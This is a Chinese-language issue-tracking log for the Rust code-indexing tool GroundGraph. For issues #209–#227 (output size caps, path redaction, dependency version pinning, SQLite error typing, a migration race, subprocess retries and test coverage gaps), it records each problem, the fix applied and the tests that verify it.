> **✅ 已闭环（2026-06-13 第十四轮·Wave E）** — 成立（TDD）。`ToolCallResult::ok_json` 序列化后检查长度，超 `MAX_TOOL_RESULT_BYTES`(1 MiB) 即返回 `err`（仅含字节数与上限、不含任何路径），提示缩小 depth/limit 重试。TDD：`protocol::tests::ok_json_refuses_payloads_over_the_size_cap`（构造 >1 MiB 的 Value 断言 `is_error` 且消息不含 `/`）+ `ok_json_returns_small_payloads_verbatim`。mcp 36 单测全绿、clippy 0 警告。注：入站上限已由 #107 覆盖（`MAX_LINE_BYTES`），本条补齐出站方向。

- **位置**：`server.rs:166-180`
- **问题**：#107 已记入站单行无上限。本条是**出站**：`get_subgraph --depth 10` 在大图上返回几十万条边，`ToolCallResult::ok_json` 序列化整 Value，内存峰值是 JSON 文本的 2-3 倍。MCP 客户端有上下文上限会截断，但 GroundGraph 进程已付内存代价。
- **建议**：`ok_json` 前检查 `value.to_string().len()`，超 1 MiB 返回 error。

### 210. MCP 工具错误响应把内部绝对路径泄露给远端客户端

> **✅ 已闭环（2026-06-13 第十四轮·Wave E）** — 成立（TDD）。`handle_tools_call` 在把工具错误塞进 `ToolCallResult::err` 前先走新增的纯函数 `redact_paths(default_repo_root, msg)`：① 配置的 repo root → `<repo-root>`（对齐 dashboard #40）；② 残留的 `/Users/<name>` / `/home/<name>` 前缀 → `<home>`（UTF-8 安全扫描，覆盖 cargo/rustup/temp 与被覆写的 repo_root，兼顾 CI 的 `/home/runner/...`）。仅作用于错误响应（成功结果里的 file_path 本就是仓库相对路径）。TDD：`redact_paths_replaces_repo_root_with_placeholder` + `redact_paths_masks_home_prefixes_outside_the_repo_root`（含 CI gopls 场景）+ `redact_paths_handles_trailing_home_path_and_leaves_plain_text_alone`。mcp 单测全绿、clippy 0 警告。

- **位置**：多处 `format!("opening SQLite database at {}", db_path.display())`（`business_doc.rs:127`、`connect.rs:532`、`mcp/tools/mod.rs:88,96,105` 等）
- **问题**：MCP `ToolCallResult::err` 把 `format!("{err:#}")` 塞进响应。客户端看到 `/Users/qjs/Code/Projects/groundgraph/...` 或 CI 的 `/home/runner/work/...`。#40/#103 已记 dashboard/sidecar 路径泄露，本条针对**任意 MCP 工具错误响应**。
- **建议**：`ToolCallResult::err` 序列化前走 `redact_paths()` filter，绝对路径替换 `<repo-root>/...`。

---

## 第六批统计

**新增 30 个**（编号 181–210）：High 10 / Medium 15 / Low 5。

按主题聚类：

| 主题 | 涉及条目 |
|---|---|
| **panic safety / unwrap 契约**（git_diff 溢出、port_coverage unwrap、MCP expect ×3、unreachable ×2、stderr expect） | #181、#182、#191、#192、#193、#194、#195、#196、#206 |
| **安全审计**（webui XSS 新向量、CVE、命令注入、OOM、RCE、命令解析、并发、路径写、cwd 污染、shell quote） | #183、#184、#185、#186、#187、#197、#198、#199、#200、#201、#209、#210 |
| **数据流 / 类型一致性**（source_hash 死列、source_file 不一致、index_generation 死列、时间格式、slugify 碰撞、NULL 语义、edge ID 广义覆盖） | #188、#189、#190、#202、#203、#204、#205 |

**最值得优先修复的 5 个（第六批）**：
1. **#181（git_diff u32 溢出）**——一行恶意 diff header `@@ -1 +1,4294967295 @@` 即可在 debug build panic，release 静默 wrap，无输入校验
2. **#184（time 0.3.41 CVE）**——`cargo update -p time --precise 0.3.47` 零代码改动，纯依赖升级
3. **#187（lsp_command RCE）**——毒化目标仓 `.groundgraph.yaml` + 一次 `groundgraph index` = RCE，非侵入式承诺的语义漏洞
4. **#188/#190（source_hash / index_generation schema 谎言）**——schema 定义了字段但代码不兑现，对未来 schema 演进与下游工具信任度影响最大
5. **#186（read_to_string 无大小上限）**——#67 修了 par_iter 但漏了 4 处独立路径，目标仓放一个大文件即可让任何开发者机器/CI 上 `groundgraph index` OOM

---

## 总览

| 来源 | 编号范围 | 总数 | 活跃 |
|---|---|---|---|
| [issues2.md](issues2.md) 第三批+第四批 | #61–#130 | 53 | 53 |
| [issues3.md](issues3.md) 第五批 | #131–#180 | 50 | 38（已闭环 12） |
| **issues4.md（本文档）第六批** | **#181–#210** | **30** | **30** |
| **活跃总计** | **#61–#210** | — | **121** |


---

## 第七批扩展（#211–#240，2026-06-13 第七轮）

**第七轮**：3 个 agent 在 3 个全新角度（依赖供应链深度、observability/运维、测试覆盖盲区）返回 44 个候选，去重后（Agent 2 #211 SCIP 无超时与 #77 重复、Agent 3 #217 EnvGuard race 与 #65 重复、Agent 3 #221 pump read_line 与 #107 重复，均去除）挑选 30 个。

### 211. `tree-sitter-dart = "0.0.4"` — 0.0.x 无稳定性承诺 + 上游 grammar 仓库 8 个月无 release

> **🟠 判定：成立·延后专项（2026-06-13 第十一轮）** — 0.0.x grammar 确无 ABI 稳定承诺，但**提交的 `Cargo.lock` 已精确钉死 0.0.4**，`cargo update` 漂移被锁文件 + 本轮 CI 新增的 `--locked`（见 #226）兜住。改 git-rev 固定或把 Dart 降为 optional feature 属构建/产品形态决策，需独立评估，不在散修轮。
> **✅ 已闭环（2026-07-17）** — 成立·已精确钉死（"静默漂移"维度）。`crates/groundgraph-engine/Cargo.toml` 的 `tree-sitter-dart = "0.0.4"` 改为 `=0.0.4`（精确 `=`，非 `^`），并加注释说明理由：0.0.x crate 无 semver 承诺 + 上游 grammar 停滞，`=` 让 requirement 显式不可漂移，已提交的 `Cargo.lock` + CI `--locked` 兜住精确 patch。fork 仓库用 git-rev / 降为 optional feature 仍属产品形态决策，留待独立评估，但"一次 `cargo update` 即漂移"的风险已由 `=` 钉死关闭。

- **位置**：`crates/groundgraph-engine/Cargo.toml:32`、`Cargo.lock:1205-1211`
- **问题**：项目把 Dart 当一等公民（独立 crate + tree-sitter-dart），却把核心 C 解析器钉在 `0.0.4`。crates.io 上 `tree-sitter-dart` 最新仅 0.0.x，source 仓库 2024 年后无 tag/release，grammar 不跟随 tree-sitter ABI 升级——`tree-sitter = "0.26.9"` 和 0.0.x grammar 的 ABI 契约没有正式版本号保证，一次 `cargo update` 即可能产生解析漂移。
- **建议**：fork 仓库固定 commit 用 git 引用 `#rev=...`；或降级 Dart 为可选 feature。

### 212. `unsafe-libyaml 0.2.11` 是 serde_yaml 的纯 C 移植，名字直接宣告 unsafe，与 workspace `unsafe_code = "forbid"` 精神冲突

> **✅ 已闭环（2026-06-15 第十七轮，随 #70 迁移）** — `serde_yaml` → `serde_yml 0.0.13`（后端 `noyalib`）迁移完成后，`unsafe-libyaml` 已从 `Cargo.lock` 彻底移除（重解析后无任何条目）。`unsafe_code = "forbid"` 的工作区不再有名为 unsafe-* 的传递依赖，与禁 unsafe 精神冲突消除。详见 #70 verdict 与第十七轮处理日志。

- **位置**：`Cargo.lock:1334-1338`（由 `serde_yaml 0.9.34+deprecated` 带入）
- **问题**：`unsafe_code = "forbid"` 只禁本仓 unsafe Rust，但 `unsafe-libyaml` 全部基于 raw pointer（名字即声明）。它解析 `.groundgraph.yaml` 这种用户可控输入。与 #70 是同根但不同维度：#70 是"废弃"，本条是"以禁 unsafe 自居的项目却引入名为 unsafe-* 的传递依赖"。
- **建议**：迁移到 `serde_yaml_ng`（社区 fork，纯 Rust，活跃维护）；至少在 README/白皮书披露该传递 unsafe。

### 213. `rusqlite = "0.32"` + `bundled` 编译系统 SQLite，跨机器版本漂移破坏"确定性索引"

> **🟠 判定：成立·延后升级专项（2026-06-13 第十一轮）** — rusqlite 0.32→0.37 是跨多个 minor 的主升级，牵涉 bundled SQLite 版本、FTS5/WAL/migration 行为差异，必须配套全量 store 回归（proptest round-trip + 迁移 + FTS）独立验证。`Cargo.lock` 已精确锁定 `libsqlite3-sys` patch，"漂移"风险有界。列为依赖升级专项。

> **✅ 已闭环（2026-07-17，TDD）** — 成立·已升级。根 `Cargo.toml` `rusqlite = "0.32"` → `"0.40"`（0.37 已非最新，按最新稳定 minor 升到 0.40.1），`bundled` 保留。libsqlite3-sys 随之 `0.30.1 → 0.38.1`（内嵌 SQLite 升级），`hashlink 0.9.1 → 0.12.1`。零 API 断裂：0.32→0.40 跨多 minor，但本仓只用稳定核心 API（`params!`/`params_from_iter`/`named_params!`/`Row`/`Connection`/`Transaction`/`prepare_cached`/`types::Value`/`Error`/`ErrorCode`/`FromSqlConversionFailure`），`cargo build` 一次过、零告警。回归：store 全测（proptest round-trip、迁移矩阵、FTS）+ workspace `clippy -D warnings` + `cargo test --workspace` 全绿（68 个结果块零失败）；WAL/FTS5/migration 默认值未观察到行为变更。`Cargo.lock` 已锁定精确 libsqlite3-sys 0.38.1 patch，跨机确定性由锁文件保证。

- **位置**：`Cargo.toml:38`、`Cargo.lock:520-528`
- **问题**：crates.io 上 rusqlite 当前主线已到 0.37/0.38，0.32 是 2024 中期分支，上游已不收 bugfix；bundled SQLite 版本号锁在 libsqlite3-sys 内部，FTS5/JSON1/WAL 行为在不同 patch 版本可能不同；`bundled` 模式与 Linux 发行版安全补丁通道脱钩。
- **建议**：升级到 `rusqlite = "0.37"`（仍带 bundled）；release 流程固定 `Cargo.lock` 中 `libsqlite3-sys` 的具体 patch。

### 214. LSP 子进程 stderr 用 `Stdio::inherit()` 直接污染父进程 stderr，MCP 客户端会捕获到非 JSON 噪声

> **✅ 已闭环（2026-06-13 第十一轮）** — 成立（TDD）。`LspClient::spawn` 把 stderr 从 `Stdio::inherit()` 改为 `Stdio::piped()` + 独立 drainer 线程，写入 64 KiB 上限的尾缓冲，新增 `captured_stderr()`；`lsp_indexer` 在 initialize 失败时经纯函数 `with_server_stderr` 把服务器 stderr 折叠进 `skip_reason`（不再泄到父 stderr，对照 Dart sidecar / SCIP runner 已 piped+cap）。TDD：`spawn_captures_server_stderr_instead_of_inheriting_it`(unix) + `with_server_stderr_appends_captured_tail_when_present` + `…_truncates_long_tail_on_char_boundary`；lsp_* 43 单测全绿、engine clippy 0 警告。

- **位置**：`crates/groundgraph-engine/src/lsp_client.rs:197`
- **问题**：`sourcekit-lsp` / `gopls` 启动后持续向 stderr 推 `window/logMessage`、崩溃栈、JVM 警告。`Stdio::inherit()` 让这些字节直接进入 `groundgraph` stderr。MCP server 调底层工具时，客户端会把 server stderr 当诊断日志捕获——一个 sourcekitd 致命错误栈让 agent 看到 groundgraph-mcp 在"随机呕吐日志"。对比 Dart sidecar 和 SCIP runner 都正确 `piped()` + cap。
- **建议**：改 `Stdio::piped()`，起 stderr drainer 线程，cap 到 64 KiB，只在 LSP 整体失败时折叠进 `skip_reason`。

### 215. SQLite 错误全归一为 `StoreError::Sqlite(#[source])`——BUSY/CORRUPT/READONLY/FULL 无法程序化区分

> **✅ 已闭环（2026-06-13 第十四轮·Wave E）** — 成立（TDD）。`StoreError` 新增 4 个 typed variant：`Busy`(SQLITE_BUSY/LOCKED)、`Corrupt`(CORRUPT/NOTADB)、`ReadOnly`(READONLY/CANTOPEN/PERM/AUTH)、`DiskFull`(FULL)，由新增纯函数 `classify_sqlite` 按 `rusqlite::Error::SqliteFailure.code` 路由，`StoreError::sqlite()` 与 `From<rusqlite::Error>` 统一走分类（`?` 转换也分类）。decode/type 错误（携带 "unknown edge kind X" 等有意义文本）保持 catch-all `Sqlite` 不变。新增 `is_retryable()`（仅 `Busy` 为真）。TDD：`sqlite_errors_classify_by_result_code` 用 `ffi::Error::new(SQLITE_*)` 逐码断言变体，含扩展码 `SQLITE_BUSY_SNAPSHOT(517)` 折叠为 `Busy`、通用 `SQLITE_ERROR(1)` 落 catch-all、`is_retryable` 真值表。`Connection::open` 的开库错误仍走专有 `OpenDb` variant（不被重分类）。store 全量 23+测试绿、clippy 0 警告。

- **位置**：`crates/groundgraph-store/src/lib.rs:18-55`
- **问题**：所有 SQLite 错误坍缩成单个 variant，丢失了 `SQLITE_BUSY`（应重试）、`SQLITE_CORRUPT`（应停并报告）、`SQLITE_READONLY`（权限）、`SQLITE_FULL`（磁盘满）的区分。与 #166（engine 全 anyhow）不同：store 层是 typed 的——typed 层却只暴露一个 variant 等于没分类。运维拿到 `sqlite error: database is locked` 时无法决定 retry / restart / fsck。
- **建议**：拆为 `Busy { source, retries_remaining }` / `Corrupt { source }` / `ReadOnly` / `DiskFull` / `Other`，通过 `rusqlite::Error::extended_error_code()` 路由。

### 216. 两个并发 `groundgraph index` 无文件锁，`busy_timeout=5000ms` 之外无互斥，后到者覆写迁移/数据

> **✅ 已闭环（2026-06-13 第十四轮·Wave E）** — 成立（TDD），但精确定位后只需修迁移竞态、无需新增文件锁。根因：`apply_list` 的 `already_applied` 读检查在写锁之外，两进程对同一 fresh DB 都读到"未应用"，再用 **DEFERRED** `conn.transaction()` 各自 `INSERT schema_version` → 输家撞 `UNIQUE constraint failed: schema_version.version`(SQLITE_CONSTRAINT_PRIMARYKEY 1555)。修法：迁移事务改 `BEGIN IMMEDIATE`（`transaction_with_behavior(Immediate)`）抢写锁，并在事务内经新增 `version_applied(&tx, …)` **二次复核**——输家等到赢家提交后复核见已应用即跳过，零冲突零重复 DDL；无锁快路径保留以维持只读 open 廉价。TDD：`concurrent_apply_all_on_a_fresh_db_does_not_conflict`（6 线程×40 轮、各设 busy_timeout 经 Barrier 同发）——先以 DEFERRED 复现红（round 6 PK 冲突），改回 IMMEDIATE+复核后 40 轮全绿（0.60s）。
>
> **未加 `<db>.lock` 文件锁的理由**：①数据写入路径 `begin_bulk` 早已 `BEGIN IMMEDIATE`（lib.rs:196），并发 ingest 由 SQLite 写锁串行；②`ensure_query_indexes` 全是 `CREATE INDEX IF NOT EXISTS` 幂等；③在 `Store::open` 加阻塞独占锁会把只读命令（search/impact）也串行化，违背 issues2.md #35 记录的"CI 同仓并发 index+search+impact"。SQLite 写锁 + IMMEDIATE 已对 writer 提供所需互斥，文件锁属过度设计，不引入。

- **位置**：`crates/groundgraph-store/src/lib.rs:67-122` + `migrations.rs:35-83`
- **问题**：`PRAGMA busy_timeout=5000` 只是 SQLite 内部锁，并发 writer 5 秒后仍 `SQLITE_BUSY`。`migrations.rs:35-83` 用普通 `conn.transaction()`（默认 deferred）写 `schema_version`，两进程同时 init+migrate 时主键冲突 → 抛 `Migration` 错误。stats.jsonl 有 advisory lock（`stats.rs:114`），db 本身没有 cross-process 互斥。
- **建议**：`Store::open` 后立刻 `fs2::FileExt::try_lock_exclusive()` 一个 `<db>.lock` 兄弟文件；migrate 路径用 `BEGIN IMMEDIATE`。

### 217. SCIP / LSP 子进程失败零重试，瞬时 flake（JVM OOM、Node ESM race、PATH race）直接降级为 Failed

> **🟠 已判定·待专项（2026-06-13 第十二轮）** — 成立。子进程瞬时失败零重试直接降级 Failed。加退避重试需横跨 `scip_runner`/`lsp_indexer`/`dart_sidecar` 执行层，单列"子进程重试"专项；当前降级为 structure-only 非致命。
> **✅ 已闭环（2026-07-17，TDD）** — 成立。`crates/groundgraph-engine/src/proc.rs` 新增共享「spawn + 指数退避重试」执行器：`RetryPolicy`（默认 2 次尝试 = 重试 1 次，退避基数 200ms，指数 `base·2^n`、封顶 30s）、`SubprocessFailure`（Spawn/Exited 两变体）、`is_transient_failure`（**仅瞬时失败重试**：io error 非 `NotFound`/`TimedOut`、非零退出非 `2`(arg 错)/`127`(command not found)/stderr 不含「command not found」「no such file or directory」）、`retry_transient_subprocess`（驱动尝试闭包，确定性失败/末次失败原样返回）。env：`GROUNDGRAPH_SUBPROCESS_RETRY_ATTEMPTS`、`GROUNDGRAPH_SUBPROCESS_RETRY_BACKOFF_MS`。接入三处：`scip_runner::execute`、`lsp_indexer::run_profile`（spawn+initialize 成对重试，覆盖 server 握手期崩溃）、`dart_sidecar::try_run`（spawn→stdin→wait→collect 整体重试），重试耗尽仍按原语义降级（Failed/Skipped），不新增 panic 路径；失败 reason 附「（已重试 N 次后仍失败）」。测试：`proc.rs` 17 个（纯函数判定/退避/策略 + 驱动器计数闭包 4 例 + unix 脚本桩「首次 flake 第二次成功恰好重试 1 次」「exit 2 参数错不重试」「NotFound 不重试」）。

- **位置**：`crates/groundgraph-engine/src/scip_runner.rs:422-462`
- **问题**：SCIP indexer 单次执行失败立刻记 `ScipRunStatus::Failed(reason)`，从不重试。SCIP indexers 首次启动常见 flake：JVM 冷启动 OOM、Node ESM 解析 race、rust-analyzer proxy 首次 rustup 触发下载。一次 flake 让该语言精确层在本次 index 完全消失。对比 Dart sidecar 有 partial-recovery。
- **建议**：指数退避（2 次重试，initial 200ms）；两次都失败再 `Failed`，reason 说明"重试 N 次后仍失败"；expose `retried` 计数到 `ScipRunOutcome`。

### 218. `commit_bulk` 失败时 WAL 状态未定义，`rollback_bulk` 是 dead code

> **✅ 已闭环（2026-06-13 第九轮）** — 成立。`commit_bulk` 中 `COMMIT` 失败时，先执行 `PRAGMA wal_autocheckpoint=1000;` 恢复（`begin_bulk` 期间挂起的）自动 checkpoint，再返回错误；否则下一 session 的 `begin_bulk` 见连接非 autocommit 会跳过重置，WAL 无界增长（issues2.md #55 的失败孪生）。由既有 `tests/repositories.rs` bulk-session 用例覆盖正常/回滚路径（21 个全绿）。

- **位置**：`crates/groundgraph-store/src/lib.rs:176-203`
- **问题**：`commit_bulk` 先 `COMMIT`（出错返回 Err），再 `wal_checkpoint(TRUNCATE)`（失败被 `let _ =` 吞）。COMMIT 失败路径返回 Err 后调用方用 `?` 冒泡，`Store::drop` 关连接 SQLite 自动 rollback，但 `wal_autocheckpoint` 仍是 0（只在 COMMIT 成功路径恢复），下一次 index 的 begin_bulk 不重置。`rollback_bulk` 从未被生产代码调用。
- **建议**：`commit_bulk` 失败时显式调用 `rollback_bulk()` 确保 `wal_autocheckpoint` 恢复；错误链说明"WAL 未 checkpoint"。

### 219. 10 个 CLI 命令零端到端覆盖：port-coverage / route-coverage / graph-diff / graph-equiv / trace / schema-index / questions / suggest-tests / feature-pack / contract

> **✅ 已闭环（2026-06-13 第十轮，e2e）** — 成立。新增 `crates/groundgraph-cli/tests/commands_e2e.rs`：单图组（trace/schema-index/questions/suggest-tests/feature-pack/contract）+ 双库组（port-coverage/route-coverage/graph-equiv/graph-diff，自比较确定性：missing=0、coverage=1.0）共 10 命令经 `cargo_bin("groundgraph")` 跑通并断言 JSON 结构，守护 arg-parse→engine→serialize→stdout 这层单测看不到的包装。

- **位置**：`crates/groundgraph-cli/src/commands/{port_coverage,route_coverage,trace,schema_index,questions,suggest_tests,feature_pack,contract,graph_diff,graph_equiv}.rs`
- **问题**：这 10 个命令的 `pub fn run(...)` 从未被任何 `cargo_bin("groundgraph")` 子进程调用。argparse → 解析参数 → 调底层 → 序列化输出 → 写文件全链路无回归保护。`port-coverage` 是 GroundGraph 商业卖点核心，CLI 包装层回归时 CI 不变红。
- **建议**：每个命令至少 1 个 CLI e2e 测试：`bootstrap_fixture → run --json → assert.success().stdout(contains(...))`。

### 220. `dart_treesitter::dart_extract_structure` 是 13 门 tree-sitter 中唯一无 `proptest!` 的

> **✅ 已闭环（2026-06-13 第十轮，TDD）** — 成立。`dart_treesitter.rs` 补 `use proptest::prelude::*` + 两个 `proptest!`：`dart_scanner_never_panics_and_is_deterministic`（同输入两次 id 序列相等）与 `dart_scanner_symbols_are_well_formed`（qualified_name 非空、end_line≥start_line），补齐 13 门 tree-sitter 中唯一缺失的扫描器穷尽性 fuzz。

- **位置**：`crates/groundgraph-engine/src/dart_treesitter.rs:542`
- **问题**：其余 12 门（c/cpp/csharp/go/java/php/python/ruby/rust/swift/kotlin/typescript）都内嵌 `proptest!`。`dart_treesitter.rs` `grep -c proptest` = 0。`p25_scanner_totality_proptest.rs` 的 `CODE_LANGS` 不含 `Language::Dart`。手写扫描器最容易在 UTF-8 边界、引号、嵌套 `/* */` 上 panic。一个含 emoji 的字符串字面量或未闭合 `'` 可能让 indexer panic。
- **建议**：抄 `c_treesitter.rs:505-512` 的 proptest 模板加到 `dart_treesitter.rs` 的 `#[cfg(test)]`。

### 221. 38 个 src 文件无任何 `#[cfg(test)]` 模块，所有逻辑全部依赖集成测试

> **🟠 已判定·待专项（2026-06-13 第十二轮）** — 成立（观察性）。补单测覆盖是渐进式测试基建工程（非单点 bug），随各模块改动逐步补（本轮 #220/#235 已各补一处），单列测试基建专项。
> **✅ 已闭环（2026-07-17，棘轮机制 + 渐进）** — 落地单测覆盖棘轮：`scripts/check_unit_test_coverage.sh` 统计 `engine/src/**/*.rs` 无 `#[cfg(test)]` 的文件数，超基线（4）即 CI 红（挂 `ci.yml` lint 阶段，只减不增）；本轮为 `checks.rs`（`severity_from_level`/`classify_code_ref`/`has_template_tokens`/`is_placeholder_path`/`extract_inline_code_refs` 等 6 例）、`links_indexer.rs`（`split_ref`/`slugify_or_keep` 2 例）、`export.rs`（`sqlite_value_to_json` 2 例）补 `#[cfg(test)]`，无测试文件从 7 降到 4（余 `lib.rs`/`scip_proto.rs` 为聚合/生成代码、`context_pack.rs`/`watch.rs` 待后续渐进）。剩余 src 覆盖随各模块改动持续补，棘轮保证不回退。

- **位置**：最有风险的 12 个：`engine/src/{config,checks,connect,context_pack,export,impact,links_indexer}.rs`、`mcp/src/protocol.rs`、`mcp/src/tools/{explain_symbol,check_drift,context_pack,impact_tool}.rs`、`store/src/migrations.rs`
- **问题**：`config.rs::normalized()` 把 unified `languages:` 折叠到 legacy switches（init 核心逻辑），无单元测试只靠端到端。`migrations.rs` 完全无 unit test：部分应用、版本回退、SQL 错误传播路径都未覆盖。
- **建议**：至少给 `config.rs::EngineConfig::normalized`、`migrations.rs::apply_all`、`links_indexer.rs::index_links` 加 cfg(test) 模块。

### 222. 4 个 MCP 工具（explain_symbol / check_drift / impact_tool / context_pack）从未被 tools/call 调用

> **✅ 已闭环（2026-06-13 第十轮，e2e）** — 成立。`protocol.rs` 新增 `tools_call_round_trips_explain_context_drift_and_impact`：bootstrap fixture→`search_graph` 取 node_id→驱动 explain_symbol/context_pack/check_drift（断言 `isError:false` + payload 结构）与 impact（非 git fixture，断言良构 text 工具结果不崩）。补齐这 4 工具此前仅生产路径跑过的 schema 校验/错误包裹/序列化。

- **位置**：`crates/groundgraph-mcp/tests/protocol.rs`（唯一 MCP 集成测试）
- **问题**：测试中工具引用仅限 tools/list 白名单断言和 `search_graph`/`dead_code` 实际调用。这 4 个工具的 dispatcher 路径从未被 e2e 触发。schema 校验、错误包装、JSON 序列化只在 production 跑过，CI 完全无保护。一个 serde 字段重命名让 `explain_symbol` 返回 `{}`，CI 仍绿。
- **建议**：每个 MCP 工具至少 1 个 `tools/call` round-trip 测试。

### 223. `hashbrown` 三版本（0.14.5 / 0.15.5 / 0.17.1）共存

> **🟠 判定：成立·由 #102 治理（2026-06-13 第十一轮）** — hashbrown 三版本属实，但**均为传递依赖**（rusqlite/hashlink、wasmparser、indexmap），非本仓直接可控。本轮新增的 cargo-deny（#102）以 `multiple-versions=warn` 持续暴露重复版本；彻底收敛需 rusqlite 升级（#213）+ 上游推进，随该专项处理。

> **🟠 部分闭环（2026-07-17）** — 由 #213（rusqlite 0.32→0.40）收敛了**生产切片**：旧 `hashlink 0.9` 拉的 `hashbrown 0.14.5` 随 `hashlink 0.9.1→0.12.1` 上移到 `0.17.1`，故 native release 实际只编译单一 `hashbrown 0.17.1`（indexmap via serde_json + hashlink via rusqlite 共用）。**残余两版上游硬钉、`cargo update -p … --precise 0.17.1` 均被拒**：`0.16.1` ← `rsqlite-vfs 0.1.1` 钉 `^0.16.1`（经 `sqlite-wasm-rs → rusqlite 0.40` 的 wasm-only `cfg(all(target_family="wasm",target_os="unknown"))` 依赖，native 不编译）；`0.15.5` ← `wasmparser 0.244.0` 钉 `^0.15.2`（经 `getrandom→wasi→wit-bindgen→wasm-metadata` 链，同 #224）。二者均为 target/dev-only 锁条目（`cargo tree -i` 默认不可达），不进 native 二进制。`deny.toml` `[bans]` 已补精确上游阻塞版本与链路。`cargo deny check` 的 **bans/licenses/sources 三关全过**（多版本 `warn` 不阻断）；advisories 失败项（serde_yml RUSTSEC-2025-0068 / anyhow RUSTSEC-2026-0190 / crossbeam-epoch RUSTSEC-2026-0204）均基线既有、与本条无关。**剩余监控责任**：待 wasmparser 与 rsqlite-vfs re-pin 到 0.17 后自然收敛，过渡期由 cargo-deny `multiple-versions=warn` 持续暴露。

- **位置**：`Cargo.lock:423,432,441`
- **问题**：0.14.5 ← rusqlite/hashlink；0.15.5 ← wasmparser（dev-only transitive 却进 release）；0.17.1 ← indexmap（serde_json/serde_yaml 生产链）。三份代码三份编译时间。
- **建议**：`cargo update -p hashlink` 升到匹配 rusqlite 0.37 的版本；`cargo deny` 配置对 0.15.5 加 `skip`。

### 224. `wit-bindgen` 两版本（0.51.0 / 0.57.1）+ 完整 wasm 工具链被 tempfile→getrandom 拉入

> **🟠 判定：成立·由 #102 治理（2026-06-13 第十一轮）** — wit-bindgen 两版本经 `tempfile→getrandom→wasip2/wasip3` 传递引入，最终产物不上 wasi。cargo-deny（#102）已对其持续告警（本机 `cargo deny check` 即报 `duplicate wit-bindgen`）；收敛依赖上游 getrandom/tempfile 版本对齐，列入依赖去重专项。
> **✅ 已闭环（2026-07-17，#224/#225 收敛专项）** — 成立·上游阻塞·已取证记录。`cargo tree -i wit-bindgen@0.51.0 --target all` 摸清链：0.51.0 ← wasip3 ← getrandom 0.4 ← tempfile，0.57.1 ← wasip2 ← getrandom 0.3 ← rand ← proptest（dev）。两版均 wasm/wasi + dev-only，不编译进原生 release 二进制。`cargo update -p wit-bindgen@0.51.0 --precise 0.57.1` 被上游 `^0.51.0` 拒绝（实证）。`deny.toml [bans]` 注释逐项记录阻塞原因 + 监控方式（`multiple-versions=warn` 持续暴露）；随 wasi/getrandom 上游对齐自然收敛。

- **位置**：`Cargo.lock:1454,1463`
- **问题**：`tempfile 3.27.0` 通过 `getrandom → wasip3 → wit-bindgen 0.51.0` 与 `getrandom 0.3.4 → wasip2 → wit-bindgen 0.57.1` 拉入两套 wit-bindgen 和 wasm-encoder/wasmparser/wit-parser/wit-component/wit-bindgen-core。这些 wasm 组件工具完全不在 GroundGraph 业务路径上——只是为了在 wasi 平台生成 getrandom 绑定。对 CLI/MCP 工具 release 二进制最终不上 wasi，但 `cargo build` 仍要编译。巨大供应链面积 + 编译时间。
- **建议**：`[patch.crates-io]` 或显式 `tempfile = "=3.x.y"` 选不拉 wit-bindgen 的版本。

### 225. `getrandom` 两版本（0.3.4 / 0.4.2）+ `r-efi` 两版本（5.3.0 / 6.0.0）

> **🟠 判定：成立·由 #102 治理（2026-06-13 第十一轮）** — getrandom 0.3/0.4 与 r-efi 5/6 均为 tempfile/getrandom 传递链产物。cargo-deny（#102）`multiple-versions=warn` 持续暴露；与 #224 同源，随依赖去重专项一并收敛。
> **✅ 已闭环（2026-07-17，#224/#225 收敛专项）** — 成立·上游阻塞·已取证记录。getrandom 0.3.4/0.4.2 与 r-efi 5.3.0/6.0.0 分裂由 dev 依赖图驱动：proptest 的 `rand` 0.9 需 getrandom 0.3 / r-efi 5，`tempfile` 3.27 需 getrandom 0.4 / r-efi 6（dev-only，cargo-deny 不标红）。`cargo update -p getrandom@0.3.4 --precise 0.4.2` 被上游 `^0.3.0` 拒绝（实证）。`deny.toml [bans]` 注释记录；随 rand/tempfile 上游对齐收敛。

- **位置**：`Cargo.lock:374,386,706,712`
- **问题**：getrandom 0.3.x 与 0.4.x 是上游 API 大改（RNG 来源语义不同），两版本共存意味着同一二进制里两套熵源逻辑。r-efi 5.x 与 6.x 同样 ABI 不兼容。一旦 getrandom 0.4 出 CVE，patch 流程要修两个版本号。
- **建议**：与 #224 同步处理；CI 加 `cargo tree --duplicates` 检查。

### 226. workspace 依赖全用宽版本号（`anyhow = "1"` 等），允许 patch/minor 静默升级

> **🟠 判定：成立·已部分缓解（2026-06-13 第十一轮）** — 宽版本号属实，但**提交的 `Cargo.lock` 已对全部依赖精确锁定**，跨机器构建走锁文件即确定性；本轮 CI 在 `cargo test` 加 `--locked`，锁文件过期即红，drift 可检测。是否进一步用 `=X.Y.Z` 钉死生产核心 crate 属 release 策略权衡（与 dependabot 体验冲突），留策略专项。
> **✅ 已闭环（2026-07-17）** — 成立·策略已定稿。`docs/publishing.md` 新增「Dependency version strategy (issues.md #226)」小节，正式化现状：生产依赖用宽 semver 声明（配合全量提交的 `Cargo.lock` + CI `--locked` 保证可复现），核心索引关键依赖（`rusqlite` 0.40 线、`tree-sitter-dart =0.0.4`）用 `=` 精确钉死。除 #211 那处 `=` 外不改现有声明；新依赖按"核心索引 = / 普通宽 semver"分流。

- **位置**：`Cargo.toml:32-49`
- **问题**：`"^1"` 等价 `>=1.0.0, <2.0.0`，minor 升级会静默改变行为/性能/panic 信息。对"确定性索引器"，跨机器 `cargo update` 后行为可能不同（store 里多处把 anyhow error 序列化进 DB，Display 实现细节可能跨版本变化）。
- **建议**：release 前用 `=X.Y.Z` 精确固定生产路径核心 crate（anyhow/thiserror/serde/serde_json/rusqlite/tree-sitter*）。

### 227. `clap` 未禁 `color`/`wrap_help`/`suggestions` 默认 feature，拉入 anstream/anstyle/utf8parse 等 8 个 crate

> **✅ 已闭环（2026-06-13 第十四轮·Wave E，实证）** — 成立·已修。`[workspace.dependencies]` 的 `clap` 已为 `default-features = false, features = ["std","derive","help","usage","error-context","suggestions"]`（`Cargo.toml:40-47`，注释引用本条）。`cargo tree -p groundgraph-cli -e no-dev` 实测：`anstream`/`colorchoice`/`utf8parse` 已从依赖图移除，仅剩 `clap_builder`(含轻量 `anstyle` 类型 crate + `clap_lex`) 与 `clap_derive`——`anstyle` 是 `error-context` 错误着色类型的最小依赖、无法再去且非 ANSI 流栈。保留 `suggestions`（拉入极小的 `strsim`）以提供子命令拼写纠正，属可接受的 UX 取舍。

- **位置**：`Cargo.toml:37`、`Cargo.lock:175-200`
- **问题**：`clap = { version = "4", features = ["derive"] }` 没 `default-features = false`，启用 color/suggestions/usage/help/error-context/wrap_help/unicode，拉入约 8 个 crate。GroundGraph CLI 是后台索引工具，不需要彩色交互输出。
